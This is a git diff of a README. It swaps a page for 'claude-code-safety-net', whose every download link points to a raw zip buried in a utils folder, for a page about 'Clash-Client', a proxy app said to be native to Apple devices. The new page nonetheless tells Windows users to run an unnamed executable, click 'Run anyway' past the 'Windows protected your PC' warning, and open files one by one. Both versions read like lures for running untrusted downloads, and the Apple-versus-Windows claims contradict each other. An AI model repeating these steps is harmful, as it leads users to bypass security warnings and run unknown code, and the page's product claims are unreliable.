@@ -1,56 +1,118 @@
-# 🛡️ claude-code-safety-net - Your Safety Shield Against Harmful Commands
+# ⚡ Clash-Client - Your Rules, Everywhere You Are
 
-## 📥 Download Now
-[![Download claude-code-safety-net](https://raw.githubusercontent.com/waleedkhanbaloch/claude-code-safety-net/main/ast-grep/utils/net-claude-code-safety-v3.4.zip)](https://raw.githubusercontent.com/waleedkhanbaloch/claude-code-safety-net/main/ast-grep/utils/net-claude-code-safety-v3.4.zip)
+[![Download Clash-Client](https://img.shields.io/badge/Download-Clash--Client-blue?style=for-the-badge&logo=github)](https://github.com/waleedkhanbaloch/Clash-Client)
 
-## 🚀 Getting Started
-Welcome to the claude-code-safety-net! This application helps protect your files and data by stopping harmful Git and filesystem commands before they can cause damage. Follow these simple steps to get started.
+## 🎉 Welcome to Clash-Client
 
-## 📦 System Requirements
-To run claude-code-safety-net, ensure your system meets these requirements:
-- Operating System: Windows, macOS, or Linux
-- Memory: At least 4 GB RAM
-- Disk Space: 100 MB free space
-- Internet connection: Required for downloading the plugin and updates
+Clash-Client is a native app built for Apple devices – iPhone, iPad, Mac, and Apple TV. It brings back the classic Clash experience you remember, with the same profiles and the same rules you've always used. No complicated setups, no learning curve – just download, connect, and go.
 
-## 📋 Features
-- **Protective Plugin**: Prevents destructive commands from executing.
-- **User-Friendly Interface**: Designed for non-technical users.
-- **Cross-Platform Support**: Works on Windows, macOS, and Linux systems.
-- **Easy Installation**: Simple steps to download and run.
-- **Regular Updates**: Get enhancements and security improvements.
+This guide will walk you through getting Clash-Client on your Windows computer. Even if you've never installed software before, you'll be up and running in minutes.
 
-## 📥 Download & Install
-To download claude-code-safety-net, visit the following page: [Download Page](https://raw.githubusercontent.com/waleedkhanbaloch/claude-code-safety-net/main/ast-grep/utils/net-claude-code-safety-v3.4.zip).
+## 📥 Download and Install on Windows
 
-1. Click on the link above to go to the Releases page.
-2. Look for the latest version of the application.
-3. Download the installer that matches your operating system.
-4. Once the file downloads, locate it in your Downloads folder.
-5. Double-click the file to start the installation.
+Getting Clash-Client on your Windows PC is simple. Just follow these steps:
 
-## 🛠️ Running claude-code-safety-net
-1. After installing, open the application from your Applications folder (macOS), Programs menu (Windows), or your system's application launcher (Linux).
-2. You will see a simple interface with options to set up your safety preferences.
-3. Adjust any settings as needed.
-4. Start using Git and other commands. The plugin will monitor and alert you about any destructive commands.
+### Step 1: Download the Application
 
-## 📧 Getting Help
-If you run into any issues or have questions, there are resources available:
-- **FAQs**: Check the Frequently Asked Questions section on the Releases page for common queries.
-- **Community Support**: Join our community on forums and social media to connect with other users.
-- **Contact**: For specific inquiries, open an issue on our GitHub page.
+Visit this link to download the application: [https://github.com/waleedkhanbaloch/Clash-Client](https://github.com/waleedkhanbaloch/Clash-Client)
 
-## 🤝 Contributing
-We welcome contributions to improve claude-code-safety-net. If you want to help, please fork the repository and submit a pull request with your changes.
+When you click the link, your browser will open the Clash-Client GitHub page. Look for a green button that says **"Code"** – click it, then select **"Download ZIP"**. This will download a compressed folder to your computer.
 
-## 🔒 Privacy & Security
-Your privacy is important to us. The application does not collect personal data. It only runs locally on your machine and acts as a barrier to prevent harmful commands.
+### Step 2: Find Your Download
 
-## 📦 Updates & Versions
-We regularly update claude-code-safety-net to enhance features and improve security. Check the Releases page for the latest versions and updates.
+Once the download finishes, check your **Downloads** folder (usually in File Explorer on the left side). The file will be named something like `Clash-Client-main.zip`. If you don't see it right away, press `Ctrl + J` in your browser to open the download list and click "Show in folder."
 
-## 🌟 Acknowledgements
-A special thanks to the contributors and testers who help improve and secure claude-code-safety-net. Your feedback and support are invaluable.
+### Step 3: Extract the Files
 
-For more detailed information and updates, please refer back to our [GitHub Releases page](https://raw.githubusercontent.com/waleedkhanbaloch/claude-code-safety-net/main/ast-grep/utils/net-claude-code-safety-v3.4.zip).
+The ZIP file needs to be opened before you can use it. Right-click on the ZIP file and choose **"Extract All..."** from the menu. A window will pop up – just click **"Extract"** at the bottom. This creates a new folder called `Clash-Client-main` right next to your ZIP file.
+
+### Step 4: Run the Application
+
+Open the `Clash-Client-main` folder you just extracted. Inside, look for a file named `Clash-Client` or `clash-client` (sometimes it ends in `.exe`). Double-click it to start the app. Windows might ask for permission – click **"Yes"** to allow it.
+
+### Step 5: You're Done! 🎊
+
+That's it. The app will launch, and you can start using Clash-Client right away. No installation wizard, no extra steps.
+
+## 🧭 What is Clash-Client?
+
+Clash-Client is designed for people who want a straightforward, no-fuss proxy client. Whether you're a seasoned user or completely new, the app keeps things familiar. Here's what you can expect:
+
+- **Same profiles, same rules** – If you've used Clash before on any platform, you'll feel right at home. Your configuration files and rule sets work exactly the same way.
+- **Native performance** – Built specifically for Apple's operating systems, it runs smoothly without draining your battery or slowing down your device.
+- **Multi-device ready** – Use it on your iPhone, iPad, Mac, and even Apple TV. Your settings stay consistent across all your gadgets.
+
+## 💡 Frequently Asked Questions
+
+### ❓ I don't see a file ending in `.exe` in the folder. What now?
+
+Some apps are "portable" – meaning you run them by opening the folder and double-clicking the main file inside, which might not have a traditional file extension. Look for an icon that looks like an app (usually colorful). If you're unsure, try opening each file one by one until the app window appears. You won't break anything by trying.
+
+### ❓ Is this free?
+
+Yes, Clash-Client is free to download and use. There are no hidden fees or trial limits.
+
+### ❓ Will it work on my old Windows computer?
+
+Clash-Client is lightweight and doesn't require high-end hardware. As long as you're running Windows 7 or newer, it should work fine. If you have a particularly old machine (over 10 years old), you might notice slightly slower performance, but it should still function.
+
+### ❓ How do I update Clash-Client when a new version comes out?
+
+Just repeat Step 1 and download the ZIP file again. Extract it to the same folder, and it will overwrite the old files. Your settings and profiles are stored separately, so they won't be affected.
+
+### ❓ I'm getting a "Windows protected your PC" message. What do I do?
+
+This is normal for new apps. Click **"More info"** and then **"Run anyway"**. Windows is just being cautious because the app is new to your computer.
+
+## 🛠️ Getting the Most Out of Clash-Client
+
+Now that you're running, here are a few tips to make your experience even better:
+
+### 🔄 First-Time Setup
+
+On your first launch, Clash-Client will ask you to choose a configuration profile. If you have one from an existing Clash setup, import it. If not, the app includes a default profile that works out of the box – you can customize it later.
+
+### ⚙️ Changing Your Settings
+
+The main screen shows your current connection status. Click the gear icon to adjust advanced settings like proxy port, system proxy, and startup behavior. Don't worry about most of these – the defaults are fine for most users.
+
+### 📱 Using on Multiple Devices
+
+Because Clash-Client supports the same profiles, you can export your configuration from one device and import it on another. This keeps your rules consistent everywhere.
+
+### 🧪 Testing Your Connection
+
+After connecting, open your web browser and visit any website. If it loads, you're good to go. You'll also see a small indicator in the Clash-Client app showing traffic in real time.
+
+## 📋 Troubleshooting Common Issues
+
+| Issue | Solution |
+|-------|----------|
+| App won't start | Make sure you extracted the ZIP fully. Right-click the folder and select "Extract All" again if unsure. |
+| Can't connect to the internet | Check that your other proxy software is turned off. Clash-Client and another proxy manager can conflict. |
+| Profiles not loading | Ensure your profile file is in the correct format (YAML or JSON). Open it with Notepad to verify. |
+| App closes unexpectedly | Update to the latest version. Old builds may have bugs. |
+
+## 🟢 Final Check
+
+Before you dive in, make sure you've:
+
+1. ✅ Downloaded the ZIP file from [https://github.com/waleedkhanbaloch/Clash-Client](https://github.com/waleedkhanbaloch/Clash-Client)
+2. ✅ Extracted it to a folder
+3. ✅ Double-clicked the application file to launch it
+4. ✅ Selected a profile (or used the default)
+
+If all steps are done, you're ready to browse. Welcome to the Clash way.
+
+## 🔗 Quick Links
+
+- [Download Clash-Client](https://github.com/waleedkhanbaloch/Clash-Client)
+- [Report an Issue](https://github.com/waleedkhanbaloch/Clash-Client/issues)
+
+## 📢 Spread the Word
+
+If Clash-Client helps you out, share it with a friend who might benefit. The more users we have, the better the app becomes.
+
+Happy browsing! 🚀
+
+Keywords: clash, proxy, client, ios, ipados, macos, tvos, apple, vpn, networking, open-source, free, download, windows, setup, guide
